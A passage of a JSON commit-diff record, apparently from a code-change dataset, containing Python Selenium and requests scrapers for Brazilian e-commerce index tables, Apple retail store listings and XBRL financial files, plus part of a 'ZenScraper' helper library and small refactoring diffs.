self.fetch_out.append([self.fetch_date, self.get_sales_index(url), geog, *['' for _ in range(5)]]) print(e) return self.fetch_out @staticmethod def get_sales_index(url): if 'de-faturamento' in url: return 'Sales Index' elif 'de-vendas' in url: return 'Orders Index' elif 'de-tiquete' in url: return 'Average Ticket Index' def normalize(self, raw, **kwargs): \"\"\"Save raw data to file\"\"\" data_frame=pd.DataFrame(raw, columns=self.header) data_frame.replace(to_replace=[r\"\\\\t|\\\\n|\\\\r\", \"\\t|\\n|\\r\"], value=[\"\", \"\"], regex=True, inplace=True) return data_frame def main(argv): \"\"\"Main entry\"\"\" web=Ecomsite(argv) web.run() if __name__==\"__main__\": main(sys.argv) ","sourceWithComments":"\"\"\" Robot creation for BR eCommerce Sites  \"\"\"\nimport sys\nimport os\nimport glob\nimport time\nimport random\nimport re\nfrom datetime import datetime\nfrom pathlib import Path\nimport pandas as pd\nfrom selenium.common.exceptions import NoSuchElementException\nfrom selenium.webdriver.common.by import By\nfrom selenium.webdriver.common.keys import Keys\nfrom selenium.webdriver.support.ui import WebDriverWait\nfrom selenium.webdriver.support import expected_conditions as EC\nfrom dateutil.relativedelta import relativedelta\nfrom bs4 import BeautifulSoup\nfrom lxml import etree\n\nsys.path.append('..\/..\/scripts')\nfrom pyersq.web_runner import Runner\nfrom pyersq.row import Row\nfrom pyersq.selenium_wrapper import SeleniumWrapper as SW\nimport pyersq.utils as squ\n\nfrom ms_projects.utility_scripts.zenscraper import ZenScraper, UtilFunctions\n\nclass Ecomsite(Runner):\n    \"\"\"Collect data from website\"\"\"\n    def __init__(self, argv):\n        super().__init__(argv, output_prefix='ecomsite', output_subdir=\"raw\", output_type='excel')\n\n        self.parser = squ.get_parser()\n        self.header = ['FetchDate', 'Category', 'Geography']\n        self.is_header_added = False\n        self.fetch_out = []\n        self.fetch_date = datetime.now().strftime('%m\/%d\/%Y')\n\n\n    def get_raw(self, **kwargs):\n        \"\"\" Get raw data from source\"\"\"\n        input_data = pd.read_csv(os.path.abspath(f'{self.outdir}\/input\/ecomsite_input.csv'))\n        url_dict = input_data.set_index('Links').to_dict()['Geography']\n\n        for count, (url, geog) in enumerate(url_dict.items()):\n            try:\n                with SW.get_driver() as driver:\n                    SW.get_url(driver, url, sleep_seconds=1)\n\n                    if UtilFunctions().is_partial_run(self.parser):\n                        if count > 3:\n                            self.fetch_out = UtilFunctions.end_partial_run(self.fetch_out)\n                            break\n\n                    WebDriverWait(driver, 60).until(\n                        EC.frame_to_be_available_and_switch_to_it(\n                            (By.XPATH, \"\/\/iframe[contains(@title, 'Table Master')]\")\n                        )\n                    )\n\n                    time.sleep(5)\n                    if not self.is_header_added:\n                        table_header = ZenScraper().get_html_table(driver=driver, just_header=True, id='theTable')\n                        for header in table_header:\n                            self.header.append(header)\n                        self.is_header_added = True\n\n                    print('table scraping on url: ', url)\n                    table_data = ZenScraper().get_html_table(driver=driver, id='theTable')\n                    for data in table_data:\n                        self.fetch_out.append([self.fetch_date, self.get_sales_index(url), geog, *data])\n\n            except Exception as e: #pylint: disable=broad-except\n                self.fetch_out.append([self.fetch_date, self.get_sales_index(url), geog, *['' for _ in range(5)]])\n                print(e)\n\n        return self.fetch_out\n\n    @staticmethod\n    def get_sales_index(url):\n        if 'de-faturamento' in url:\n            return 'Sales Index'\n        elif 'de-vendas' in url:\n            return 'Orders Index'\n        elif 'de-tiquete' in url:\n            return 'Average Ticket Index'\n\n    def normalize(self, raw, **kwargs):\n        \"\"\"Save raw data to file\"\"\"\n        data_frame = pd.DataFrame(raw, columns=self.header)\n        data_frame.replace(to_replace=[r\"\\\\t|\\\\n|\\\\r\", \"\\t|\\n|\\r\"],\n                   value=[\"\", \"\"], regex=True, inplace=True)\n        return data_frame\n\ndef main(argv):\n    \"\"\"Main entry\"\"\"\n    web = Ecomsite(argv)\n    web.run()\n\nif __name__ == \"__main__\":\n    main(sys.argv)\n"},"\/global_applestore\/applestore.py":{"changes":[{"diff":"\n         \"\"\" Get raw data from source\"\"\"\n         scraper = ZenScraper()\n         scraper.get(self.datapoints['base_url'])\n-        self.get_locale(scraper)\n-        # scraper.get('https:\/\/www.apple.com\/jp\/retail\/shinsaibashi\/')\n-        # individual_store_json = scraper.get_json_from_html_script_tag(id='__NEXT_DATA__')\n-        # print(individual_store_json)\n+        # self.get_locale(scraper)\n+        scraper.get('https:\/\/www.apple.com\/retail\/fifthavenue\/')\n+        individual_store_json = scraper.get_json_from_html_script_tag(id='__NEXT_DATA__')\n+        print(individual_store_json)\n \n         return self.fetch_out\n \n","add":4,"remove":4,"filename":"\/global_applestore\/applestore.py","badparts":["        self.get_locale(scraper)"],"goodparts":["        scraper.get('https:\/\/www.apple.com\/retail\/fifthavenue\/')","        individual_store_json = scraper.get_json_from_html_script_tag(id='__NEXT_DATA__')","        print(individual_store_json)"]}],"source":"\n\"\"\" Robot creation for Global Apple Retail Location \"\"\" import json.decoder import sys import calendar import re import time from datetime import datetime from dateutil.relativedelta import relativedelta from html import unescape import pandas as pd sys.path.append('..\/..\/scripts') from pyersq.web_runner import Runner from pyersq.row import Row import pyersq.utils as squ from bs4 import BeautifulSoup from ms_projects.utility_scripts.zenscraper import ZenScraper, By, UtilFunctions class Applelstore(Runner): \"\"\"Collect data from website\"\"\" def __init__(self, argv): super().__init__(argv, output_prefix='applelstore', output_subdir=\"raw\", output_type='csv') self.datapoints={ \"base_url\": \"https:\/\/www.apple.com\/retail\/storelist\/\", \"locale_json_url\": 'https:\/\/www.apple.com\/rsp-web\/autocomplete?locale=en_US', \"store_json_url\": 'https:\/\/www.apple.com\/rsp-web\/store-search?locale={}&sc=false', \"out\":['country', 'state', 'city', 'store_name', 'address_line_1', 'address_line_2', 'phone', 'url', 'id', 'updated', 'lang', 'store_name', 'address_line_1_local', 'address_line_2_local', 'state_local', 'city_local', 'postal_code', 'message_local', 'latitude', 'longitude', 'dates', 'days', 'times_local', 'special_hours', 'closed', 'time_created'], } self.parser=squ.get_parser() self.sleep_seconds=0 self.out=Row(self.datapoints['out']) self.fetch_out=[] self.fetch_date=datetime.now().strftime('%Y.%m.%dD%H:%M:%S.%f000') self.locale_to_countries={} self.root_map={} self.failed_fetch=[] def get_raw(self, **kwargs): \"\"\" Get raw data from source\"\"\" scraper=ZenScraper() scraper.get(self.datapoints['base_url']) self.get_locale(scraper) return self.fetch_out def get_locale(self, scraper): countries_element=scraper.find_elements(By.XPATH, \"\/\/select\/option\") for element in countries_element: locale=element.get_attribute('value') if locale is not None: country=element.get_attribute('innerText') self.locale_to_countries.update({locale: country}) store_list_object=scraper.get_json_from_html_script_tag(id='__NEXT_DATA__') for locale, locale_value in store_list_object['props']['locale']['allGeoConfigs'].items(): print(locale) self.root_map.update({locale: locale_value['rootPath']}) for store_data in store_list_object['props']['pageProps']['storeList']: self.out.country=self.locale_to_countries[store_data['calledLocale']] self.out.lang=store_data['locale'].replace('_', '-') if store_data['hasStates'] is False: self.out.state=self.out.country for store in store_data['store']: self.get_store_data(scraper, store, store_data) else: for state in store_data['state']: self.out.state=state['name'] for store in state['store']: self.get_store_data(scraper, store, store_data) def get_store_data(self, scraper, store, store_data, has_state=True): self.out.city=store['address']['city'] self.out.store_name=store['name'] self.out.address_line_1=store['address']['address1'] self.out.address_line_2=store['address']['address2'] self.out.phone=store['telephone'] self.out.url=self.__util_url_from_slug(store_data['locale'], self.root_map[store_data['locale']], store['slug']) self.out.id=(self.out.country +self.out.url.split('\/')[-2]).lower().replace(' ', '-') self.out.updated='TRUE' self.out.lang=store_data['locale'].replace('_', '-') try: for _ in range(5): new_scraper=ZenScraper() new_scraper.get(self.out.url, sleep_seconds=self.sleep_seconds) print('scraping data from ', self.out.url) individual_store_json=new_scraper.get_json_from_html_script_tag(id='__NEXT_DATA__') if individual_store_json is not None: local_store=individual_store_json['props']['pageProps']['storeDetails'] self.scrape_from_local_store(local_store, has_state) break self.failed_fetch.append(self.out.url) except Exception as e: self.failed_fetch.append(self.out.url) print(f'ERROR: failed at{self.out.url}{e}') def scrape_from_local_store(self, local_store, has_state): if not has_state: self.out.state_local=self.out.state else: self.out.state_local=local_store['address']['stateName'] self.out.store_name_local=local_store['name'] self.out.address_line_1_local=local_store['address']['address1'] self.out.address_line_2_local=local_store['address']['address2'] self.out.city_local=local_store['address']['city'] self.out.postal_code=local_store['address']['postal'] try: self.out.message_local=local_store['message'] except: self.out.message_local='' self.out.latitude=local_store['geolocation']['latitude'] self.out.longitude=local_store['geolocation']['longitude'] local_store_hours=local_store['hours'] self.out.closed=local_store_hours['closed'] self.out.objectkey=self.out.compute_key() past_day=0 for local_days in local_store_hours['days']: formatted_day=UtilFunctions().remove_non_digits( self.__remove_unwanted_char( local_days['formattedDayDateA11y'] ) ) cur_day=int(formatted_day) temp_year=datetime.now().year temp_month=datetime.now().month temp_date=datetime.strptime(f'{temp_year}{temp_month}{formatted_day}', '%Y %m %d') if cur_day < past_day: temp_date=temp_date +relativedelta(months=1) past_day=cur_day self.out.dates=temp_date.strftime('%Y%m%d') self.out.days=calendar.day_name[temp_date.weekday()] self.out.times_local=local_days['formattedTime'] self.out.special_hours=local_days['specialHours'] self.out.time_created=self.fetch_date self.fetch_out.append(self.out.values()) def __remove_unwanted_char(self, str): clean=re.sub('&[^;]+;', ' ', str) return clean def __util_url_from_slug(self, locale, root_path, slug): if locale=='zh_CN': url='https:\/\/www.apple.com.cn\/retail\/' +slug +'\/' else: if root_path=='\/': url='https:\/\/www.apple.com\/retail\/' +slug +'\/' else: url='https:\/\/www.apple.com' +root_path +'\/retail\/' +slug +'\/' return url def normalize(self, raw, **kwargs): \"\"\"Save raw data to file\"\"\" data_frame=pd.DataFrame(raw, columns=self.out.header()) data_frame.replace(to_replace=[r\"\\\\t|\\\\n|\\\\r\", \"\\t|\\n|\\r\"], value=[\"\", \"\"], regex=True, inplace=True) data_frame.set_index(\"ObjectKey\", inplace=True) return data_frame def cleanup(self): for data in set(self.failed_fetch): print(data) def main(argv): \"\"\"Main entry\"\"\" web=Applelstore(argv) web.run() if __name__==\"__main__\": main(sys.argv) ","sourceWithComments":"\"\"\" Robot creation for Global Apple Retail Location  \"\"\"\nimport json.decoder\nimport sys\nimport calendar\nimport re\nimport time\nfrom datetime import datetime\nfrom dateutil.relativedelta import relativedelta\nfrom html import unescape\nimport pandas as pd\n\nsys.path.append('..\/..\/scripts')\nfrom pyersq.web_runner import Runner\nfrom pyersq.row import Row\nimport pyersq.utils as squ\nfrom bs4 import BeautifulSoup\n\nfrom ms_projects.utility_scripts.zenscraper import ZenScraper, By, UtilFunctions\n\nclass Applelstore(Runner):\n    \"\"\"Collect data from website\"\"\"\n    def __init__(self, argv):\n        super().__init__(argv, output_prefix='applelstore', output_subdir=\"raw\", output_type='csv')\n        self.datapoints = {\n            \"base_url\" : \"https:\/\/www.apple.com\/retail\/storelist\/\",\n            \"locale_json_url\" : 'https:\/\/www.apple.com\/rsp-web\/autocomplete?locale=en_US',\n            \"store_json_url\" : 'https:\/\/www.apple.com\/rsp-web\/store-search?locale={}&sc=false',\n            \"out\": ['country', 'state', 'city', 'store_name', 'address_line_1',\n                    'address_line_2', 'phone', 'url', 'id', 'updated', 'lang', 'store_name',\n                    'address_line_1_local', 'address_line_2_local', 'state_local', 'city_local',\n                    'postal_code', 'message_local', 'latitude', 'longitude', 'dates', 'days',\n                    'times_local', 'special_hours', 'closed', 'time_created'],\n        }\n\n        self.parser = squ.get_parser()\n        self.sleep_seconds = 0\n        self.out = Row(self.datapoints['out'])\n        self.fetch_out = []\n        self.fetch_date = datetime.now().strftime('%Y.%m.%dD%H:%M:%S.%f000')\n        self.locale_to_countries = {}\n        self.root_map = {}\n        self.failed_fetch = []\n\n\n    def get_raw(self, **kwargs):\n        \"\"\" Get raw data from source\"\"\"\n        scraper = ZenScraper()\n        scraper.get(self.datapoints['base_url'])\n        self.get_locale(scraper)\n        # scraper.get('https:\/\/www.apple.com\/jp\/retail\/shinsaibashi\/')\n        # individual_store_json = scraper.get_json_from_html_script_tag(id='__NEXT_DATA__')\n        # print(individual_store_json)\n\n        return self.fetch_out\n\n    def get_locale(self, scraper):\n        countries_element = scraper.find_elements(By.XPATH, \"\/\/select\/option\")\n        for element in countries_element:\n            locale = element.get_attribute('value')\n            if locale is not None:\n                country = element.get_attribute('innerText')\n                self.locale_to_countries.update({locale: country})\n\n\n        store_list_object = scraper.get_json_from_html_script_tag(id='__NEXT_DATA__')\n\n        for locale, locale_value in store_list_object['props']['locale']['allGeoConfigs'].items():\n            print(locale)\n            self.root_map.update({locale : locale_value['rootPath']})\n\n        for store_data in store_list_object['props']['pageProps']['storeList']:\n\n            self.out.country = self.locale_to_countries[store_data['calledLocale']]\n            self.out.lang = store_data['locale'].replace('_', '-')\n\n            if store_data['hasStates'] is False:\n                self.out.state = self.out.country\n                for store in store_data['store']:\n                    self.get_store_data(scraper, store, store_data)\n            else:\n                for state in store_data['state']:\n                    self.out.state = state['name']\n                    for store in state['store']:\n                        self.get_store_data(scraper, store, store_data)\n\n    def get_store_data(self, scraper, store, store_data, has_state=True):\n        self.out.city = store['address']['city']\n        self.out.store_name = store['name']\n        self.out.address_line_1 = store['address']['address1']\n        self.out.address_line_2 = store['address']['address2']\n        self.out.phone = store['telephone']\n        self.out.url = self.__util_url_from_slug(store_data['locale'],\n                                                 self.root_map[store_data['locale']],\n                                                 store['slug'])\n        self.out.id = (self.out.country + self.out.url.split('\/')[-2]).lower().replace(' ', '-')\n        self.out.updated = 'TRUE'\n        self.out.lang = store_data['locale'].replace('_', '-')\n\n        try:\n            for _ in range(5):\n                new_scraper = ZenScraper()\n                new_scraper.get(self.out.url, sleep_seconds=self.sleep_seconds)\n                print('scraping data from ', self.out.url)\n                individual_store_json = new_scraper.get_json_from_html_script_tag(id='__NEXT_DATA__')\n                if individual_store_json is not None:\n                    local_store = individual_store_json['props']['pageProps']['storeDetails']\n                    self.scrape_from_local_store(local_store, has_state)\n                    break\n                self.failed_fetch.append(self.out.url)\n        except Exception as e:\n            self.failed_fetch.append(self.out.url)\n            print(f'ERROR: failed at {self.out.url} {e}')\n\n\n\n    def scrape_from_local_store(self, local_store, has_state):\n        if not has_state:\n            self.out.state_local = self.out.state\n        else:\n            self.out.state_local = local_store['address']['stateName']\n\n        self.out.store_name_local = local_store['name']\n        self.out.address_line_1_local = local_store['address']['address1']\n        self.out.address_line_2_local = local_store['address']['address2']\n        self.out.city_local = local_store['address']['city']\n        self.out.postal_code = local_store['address']['postal']\n        try:\n            self.out.message_local = local_store['message']\n        except:\n            self.out.message_local = ''\n        self.out.latitude = local_store['geolocation']['latitude']\n        self.out.longitude = local_store['geolocation']['longitude']\n        local_store_hours = local_store['hours']\n        self.out.closed = local_store_hours['closed']\n        self.out.objectkey = self.out.compute_key()\n\n        past_day = 0\n        for local_days in local_store_hours['days']:\n            formatted_day = UtilFunctions().remove_non_digits(\n                self.__remove_unwanted_char(\n                    local_days['formattedDayDateA11y']\n                )\n            )\n\n            cur_day = int(formatted_day)\n            temp_year = datetime.now().year\n            temp_month = datetime.now().month\n            temp_date = datetime.strptime(f'{temp_year} {temp_month} {formatted_day}', '%Y %m %d')\n\n            if cur_day < past_day:\n                temp_date = temp_date + relativedelta(months=1)\n            past_day = cur_day\n\n            self.out.dates = temp_date.strftime('%Y%m%d')\n            self.out.days = calendar.day_name[temp_date.weekday()]\n            self.out.times_local = local_days['formattedTime']\n            self.out.special_hours = local_days['specialHours']\n            self.out.time_created = self.fetch_date\n            self.fetch_out.append(self.out.values())\n\n    def __remove_unwanted_char(self, str):\n        clean = re.sub('&[^;]+;', ' ', str)\n        #&#26376;\n        return clean\n\n\n\n\n    def __util_url_from_slug(self, locale, root_path, slug):\n\n        if locale == 'zh_CN':\n            url = 'https:\/\/www.apple.com.cn\/retail\/' + slug + '\/'\n        else:\n            if root_path == '\/':\n                url = 'https:\/\/www.apple.com\/retail\/' + slug + '\/'\n            else:\n                url = 'https:\/\/www.apple.com' + root_path + '\/retail\/' + slug + '\/'\n        return url\n\n    def normalize(self, raw, **kwargs):\n        \"\"\"Save raw data to file\"\"\"\n        data_frame = pd.DataFrame(raw, columns=self.out.header())\n        data_frame.replace(to_replace=[r\"\\\\t|\\\\n|\\\\r\", \"\\t|\\n|\\r\"],\n                   value=[\"\", \"\"], regex=True, inplace=True)\n        data_frame.set_index(\"ObjectKey\", inplace=True)\n        # data_frame = data_frame.sort_values(by='Country', key=lambda col: col.str.lower())\n        return data_frame\n\n    def cleanup(self):\n\n        for data in set(self.failed_fetch):\n            print(data)\n\ndef main(argv):\n    \"\"\"Main entry\"\"\"\n    web = Applelstore(argv)\n    web.run()\n\nif __name__ == \"__main__\":\n    main(sys.argv)\n"},"\/us_ferc\/xbrl_scraper.py":{"changes":[{"diff":"\n \n if __name__ == \"__main__\":\n     main(sys.argv)\n-\n-run()\n-\n-if __name__ == \"__main__\":\n-    main(sys.argv)\n-\n-sys.argv)\n-\n-g","add":0,"remove":9,"filename":"\/us_ferc\/xbrl_scraper.py","badparts":["run()","if __name__ == \"__main__\":","    main(sys.argv)","sys.argv)","g"],"goodparts":[]}],"source":"\n\"\"\" Robot creation for XBRL Data Extractor \"\"\" import sys import os import glob import time import random import re from datetime import datetime from pathlib import Path import pandas as pd from selenium.common.exceptions import NoSuchElementException from selenium.webdriver.common.by import By from selenium.webdriver.common.keys import Keys from selenium.webdriver.support.ui import WebDriverWait from selenium.webdriver.support import expected_conditions as EC from dateutil.relativedelta import relativedelta from bs4 import BeautifulSoup from lxml import etree sys.path.append('..\/..\/scripts') from pyersq.web_runner import Runner from pyersq.row import Row from pyersq.selenium_wrapper import SeleniumWrapper as SW import pyersq.utils as squ from ms_projects.utility_scripts.zenscraper import ZenScraper, By, DataObject, UtilFunctions class Xbrl_Scraper(Runner): \"\"\"Collect data from website\"\"\" def __init__(self, argv): super().__init__(argv, output_prefix='xbrl_scraper', output_subdir=\"raw\", output_type='csv') self.datapoints={ \"out\":['FetchDate', 'Filename', 'Period', 'OperatingRevenues', 'OperatingExpenses', 'Depreciation', 'Amortization', 'Grand Total'], } self.parser=squ.get_parser() self.out=Row(self.datapoints['out']) self.fetch_out=[] def get_raw(self, **kwargs): \"\"\" Get raw data from source\"\"\" xbrl_dir=os.path.abspath(f'{self.outdir}\/input\/xbrl') list_of_file=glob.glob(f'{xbrl_dir}\/*xbrl') for file_path in list_of_file: openxbrl=open(file_path, 'r') doc=openxbrl.read() soup=BeautifulSoup(doc, 'lxml') tag_list=soup.find_all() period=self.search_xbrl(tag_list, 'reportperiod') return self.fetch_out def normalize(self, raw, **kwargs): \"\"\"Save raw data to file\"\"\" data_frame=pd.DataFrame(raw, columns=self.out.header()[:-1]) data_frame.replace(to_replace=[r\"\\\\t|\\\\n|\\\\r\", \"\\t|\\n|\\r\"], value=[\"\", \"\"], regex=True, inplace=True) data_frame=data_frame.sort_values(by='Country', key=lambda col: col.str.lower()) return data_frame def main(argv): \"\"\"Main entry\"\"\" web=Xbrl_Scraper(argv) web.run() if __name__==\"__main__\": main(sys.argv) run() if __name__==\"__main__\": main(sys.argv) sys.argv) gv) ","sourceWithComments":"\"\"\" Robot creation for XBRL Data Extractor  \"\"\"\nimport sys\nimport os\nimport glob\nimport time\nimport random\nimport re\nfrom datetime import datetime\nfrom pathlib import Path\nimport pandas as pd\nfrom selenium.common.exceptions import NoSuchElementException\nfrom selenium.webdriver.common.by import By\nfrom selenium.webdriver.common.keys import Keys\nfrom selenium.webdriver.support.ui import WebDriverWait\nfrom selenium.webdriver.support import expected_conditions as EC\nfrom dateutil.relativedelta import relativedelta\nfrom bs4 import BeautifulSoup\nfrom lxml import etree\n\nsys.path.append('..\/..\/scripts')\nfrom pyersq.web_runner import Runner\nfrom pyersq.row import Row\nfrom pyersq.selenium_wrapper import SeleniumWrapper as SW\nimport pyersq.utils as squ\n\nfrom ms_projects.utility_scripts.zenscraper import ZenScraper, By, DataObject, UtilFunctions\n\nclass Xbrl_Scraper(Runner):\n    \"\"\"Collect data from website\"\"\"\n    def __init__(self, argv):\n        super().__init__(argv, output_prefix='xbrl_scraper', output_subdir=\"raw\", output_type='csv')\n        self.datapoints = {\n            \"out\": ['FetchDate', 'Filename', 'Period', 'OperatingRevenues', 'OperatingExpenses',\n                    'Depreciation', 'Amortization', 'Grand Total'],\n        }\n\n        self.parser = squ.get_parser()\n        self.out = Row(self.datapoints['out'])\n        self.fetch_out = []\n\n\n    def get_raw(self, **kwargs):\n        \"\"\" Get raw data from source\"\"\"\n        xbrl_dir = os.path.abspath(f'{self.outdir}\/input\/xbrl')\n\n        list_of_file = glob.glob(f'{xbrl_dir}\/*xbrl')\n\n        for file_path in list_of_file:\n            openxbrl = open(file_path, 'r')\n            doc = openxbrl.read()\n            soup = BeautifulSoup(doc, 'lxml')\n            tag_list = soup.find_all()\n            period = self.search_xbrl(tag_list, 'reportperiod')\n            \n        return self.fetch_out\n\n    def normalize(self, raw, **kwargs):\n        \"\"\"Save raw data to file\"\"\"\n        data_frame = pd.DataFrame(raw, columns=self.out.header()[:-1])\n        data_frame.replace(to_replace=[r\"\\\\t|\\\\n|\\\\r\", \"\\t|\\n|\\r\"],\n                   value=[\"\", \"\"], regex=True, inplace=True)\n        data_frame = data_frame.sort_values(by='Country', key=lambda col: col.str.lower())\n        return data_frame\n\ndef main(argv):\n    \"\"\"Main entry\"\"\"\n    web = Xbrl_Scraper(argv)\n    web.run()\n\nif __name__ == \"__main__\":\n    main(sys.argv)\n\nrun()\n\nif __name__ == \"__main__\":\n    main(sys.argv)\n\nsys.argv)\n\ngv)\n\n"},"\/utility_scripts\/zenscraper.py":{"changes":[{"diff":"\n                 prefix += prefix_to_increment\r\n             return None\r\n \r\n-        json_object = add_strings('\"', improved_json, retry_count)\r\n-        if json_object is not None:\r\n-            return json_object\r\n-\r\n-        json_object = add_strings('', improved_json, retry_count)\r\n-        if json_object is not None:\r\n-            return json_object\r\n-\r\n-        json_object = add_strings('\"', improved_json, retry_count, prefix_to_increment=']')\r\n-        if json_object is not None:\r\n-            return json_object\r\n-\r\n-        json_object = add_strings('', improved_json, retry_count, prefix_to_increment=']')\r\n-        if json_object is not None:\r\n-            return json_object\r\n-\r\n+        for prefix_to_increment in ['}]', ']']:\r\n+            for prefix in ['', '\"', '\"}']:\r\n+                json_object = add_strings(prefix, improved_json, retry_count,\r\n+                                          prefix_to_increment=prefix_to_increment)\r\n+                if json_object is not None:\r\n+                    return json_object\r\n         return None\r\n \r\n class ZenElement:\r\n","add":6,"remove":16,"filename":"\/utility_scripts\/zenscraper.py","badparts":["        json_object = add_strings('\"', improved_json, retry_count)\r","        if json_object is not None:\r","            return json_object\r","\r","        json_object = add_strings('', improved_json, retry_count)\r","        if json_object is not None:\r","            return json_object\r","\r","        json_object = add_strings('\"', improved_json, retry_count, prefix_to_increment=']')\r","        if json_object is not None:\r","            return json_object\r","\r","        json_object = add_strings('', improved_json, retry_count, prefix_to_increment=']')\r","        if json_object is not None:\r","            return json_object\r","\r"],"goodparts":["        for prefix_to_increment in ['}]', ']']:\r","            for prefix in ['', '\"', '\"}']:\r","                json_object = add_strings(prefix, improved_json, retry_count,\r","                                          prefix_to_increment=prefix_to_increment)\r","                if json_object is not None:\r","                    return json_object\r"]}],"source":"\n\"\"\"Zenscraper Python Library v 0.2\"\"\"\r from enum import Enum\r import shutil\r import re\r import sys\r import json\r import time\r import random\r import logging\r from pathlib import Path\r from bs4 import BeautifulSoup\r import requests\r import lxml.html\r from lxml import etree\r from requests.packages.urllib3.exceptions import InsecureRequestWarning\r requests.packages.urllib3.disable_warnings(InsecureRequestWarning)\r sys.path.append('..\/..\/scripts')\r from pyersq.requests_wrapper import RequestsWrapper\r \r logging.basicConfig()\r logger=logging.getLogger(__name__)\r logger.setLevel(logging.WARNING)\r \r class ZenScraper:\r \"\"\" ZenScraper, stealth scraping that follows selenium rules. \"\"\"\r doc=None\r response=None\r \r def __find_elements_list(self, err_message=\"\", xpath=\"\", doc=None):\r \"\"\" find multiple elements in the class \"\"\"\r try:\r element_list=[]\r if doc is None:\r doc=self.doc\r elements=doc.xpath(xpath)\r for element in elements:\r element_list.append(ZenElement(element))\r if len(element_list) !=0:\r logger.info('element list generated') return element_list\r logger.warning('no element list found')\r return[]\r except(IndexError, lxml.etree.XPathEvalError,\r lxml.etree.Error, lxml.etree.XPathError) as err:\r logger.warning(err_message)\r logger.error(f'{err}') return None\r \r def __find_element(self, err_message=\"\", xpath=\"\", doc=None):\r \"\"\" find single element from the class \"\"\"\r try:\r if doc is None:\r doc=self.doc\r element=doc.xpath(xpath)\r logger.info(f'{ZenElement(element[0]).get_tag()} element found') return ZenElement(element[0])\r except(IndexError, lxml.etree.XPathEvalError, lxml.etree.XPathError,\r lxml.etree.Error) as err:\r logger.warning(err_message)\r logger.error(f'{err}') return None\r \r @staticmethod\r def __return_dict_values(by_mode, to_search, doc=None, tag=\"node()\"):\r output_dict={\r 1:{'err_message': \"<Error: id cannot be found on the html>\",\r 'xpath': f'\/\/node()[@id=\"{to_search}\"]',\r 'doc': doc},\r 2:{'err_message': \"<Error: element cannot be found on the html>\",\r 'xpath': to_search,\r 'doc': doc},\r 3:{'err_message': f\"<Error: no element that contains{to_search} in the html>\",\r 'xpath': f'\/\/{tag}[normalize-space(text())=\"{to_search}\"]',\r 'doc': doc},\r 4:{'err_message': f\"<Error: no element that contains{to_search} in the html>\",\r 'xpath': f'\/\/{tag}[contains(text(), \"{to_search}\")]',\r 'doc': doc},\r 6:{'err_message': \"<Error: tagname cannot be found on the html>\",\r 'xpath': f\"\/\/{to_search}\",\r 'doc': doc},\r }\r return output_dict[by_mode.value]\r \r def get(self, url, sleep_seconds=None):\r \"\"\"\r :param url: destination url to get document body\r :return:\r \"\"\"\r logger.info('GET request on %s', url)\r if sleep_seconds is None:\r sleep_seconds=random.randint(1, 3)\r req=RequestsWrapper()\r response=req.get(url, sleep_seconds=sleep_seconds)\r self.response=response\r self.doc=lxml.html.fromstring(response.content)\r return response\r \r @staticmethod\r def download_file(url, destination_path=\"\"):\r \"\"\"\r :param url: url to download file\r :param destination_path: directory with file name to store image data\r :return:\r \"\"\"\r req=RequestsWrapper()\r response=req.get(url)\r logger.info(f\"downloading:{url}\") filename=url.split(\"\/\")[-1]\r if destination_path==\"\":\r file_destination=filename\r else:\r UtilFunctions().create_directory(destination_path)\r file_destination=f\"{destination_path}\/{filename}\"\r \r with open(file_destination, \"wb\") as out_file:\r shutil.copyfileobj(response.raw, out_file)\r del response\r \r logger.error('error on file download')\r \r @staticmethod\r def get_html_table(driver=None, table_index=0, just_header=False, with_header=False, **kwargs): \"\"\"\r Getting HTMl Table from <table> tag inside an html\r :param driver: selenium driver to scrape table data\r :param table_index: index of the table to be sraped\r :param just_header: return an array of table header\r :param with_header: boolean if table header will be included in the scrape\r :return: list of dict if with_header==True, list of list if with_header==False\r \"\"\"\r try:\r logger.info('scraping HTML table from page_source')\r soup=BeautifulSoup(driver.page_source, 'lxml')\r if len(kwargs) > 0:\r tables=soup.find_all('table', **kwargs)\r else:\r tables=soup.find_all('table')\r \r table_body=tables[table_index].find('tbody')\r \r if just_header:\r logger.info('scraping the header of the HTML table')\r table_header=tables[table_index].find('thead')\r header=[]\r for row in table_header.find_all('tr'):\r for count, col in enumerate(row.find_all('th')):\r val=col.text.strip()\r if len(val)==0:\r header.append(str(count))\r continue\r header.append(col.text.strip())\r return header\r \r if with_header:\r logger.info('Scraping header of the HTML table with content')\r table_header=tables[table_index].find('thead')\r header=[]\r table_data=[]\r for row in table_header.find_all('tr'):\r for count, col in enumerate(row.find_all('th')):\r val=col.text.strip()\r if len(val)==0:\r header.append(str(count))\r continue\r header.append(col.text.strip())\r \r for row in table_body.find_all('tr'):\r data={}\r for count, col in enumerate(row.find_all('td')):\r val=col.text.strip()\r data.update({header[count]:val})\r table_data.append(data)\r return table_data\r \r logger.info('Scraping the body of the HTML table')\r table_data=[]\r for row in table_body.find_all('tr'):\r data=[]\r for col in row.find_all('td'):\r data.append(col.text.strip())\r table_data.append(data)\r return table_data\r except Exception as err: logger.error('HTML Table scraping failed!!!')\r logger.error(err)\r return[]\r \r def find_elements(self, by_mode, to_search, doc=None, tag=\"node()\"):\r \"\"\"\r :param by_mode: By Enumerator to search for e.g. XPATH, ID, CLASSNAME\r :param tosearch: the string to search\r :param doc: document body\r :param tag: works best with LINK_TEXT, PARTIAL_LINK_TEXT\r :return: ZenElement Object\r \"\"\"\r output_dict=self.__return_dict_values(by_mode, to_search, doc, tag)\r return self.__find_elements_list(**output_dict)\r \r def find_element(self, by_mode, to_search, doc=None, tag=\"node()\"):\r \"\"\"\r :param by: By Enumerator to search for e.g. XPATH, ID, CLASSNAME\r :param tosearch: the string to search\r :param doc: document body\r :param tag: works best with LINK_TEXT, PARTIAL_LINK_TEXT\r :return: ZenElement Object\r \"\"\"\r output_dict=self.__return_dict_values(by_mode, to_search, doc, tag)\r return self.__find_element(**output_dict)\r \r def print_html(self, is_print=True):\r \"\"\"\r Print the HTMl file on the console.\r :return: HTML File as a String\r \"\"\"\r logger.info('Printing HTML')\r if is_print:\r print(etree.tostring(self.doc, pretty_print=True))\r return etree.tostring(self.doc, pretty_print=True)\r \r def status_code(self):\r \"\"\"\r Print status_code on console\r :return: return status_code as an integer\r \"\"\"\r logger.info(self.response.status_code)\r return self.response.status_code\r \r @staticmethod\r def check_link(url, sleep_seconds=None):\r \"\"\"\r :param url: url of the link to check\r :return: check if link exists\r \"\"\"\r logger.info('Checking link %s', url)\r if sleep_seconds is None:\r sleep_seconds=random.randint(1, 3)\r req=RequestsWrapper()\r response=req.get(url, sleep_seconds=sleep_seconds)\r logger.info(response.status_code)\r return response.status_code==200\r \r def 